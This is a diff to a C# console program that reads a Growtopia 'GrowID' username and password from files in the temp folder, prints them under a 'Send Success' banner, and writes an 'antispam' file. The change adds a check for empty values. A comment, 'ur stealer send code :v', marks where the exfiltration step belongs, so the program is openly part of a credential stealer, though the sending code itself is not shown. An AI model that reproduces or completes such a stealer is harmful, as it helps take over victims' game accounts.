@@ -22,13 +22,21 @@ namespace ConsoleApp4
             string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
             string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
             #endregion
+            if(username == "" || password == "")
+            {
+                Console.WriteLine("password or username doesnt found");
 
-            Console.Write("------------------------\n| Send Success         |\n");
-            Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
-            //antispam
-            File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
+            }
+            else
+            {
+                Console.Write("------------------------\n| Send Success         |\n");
+                Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
+                //antispam
+                File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
 
-            //ur stealer send code :v
+                //ur stealer send code :v
+            }
+
         }
         static void Main(string[] args)
         {
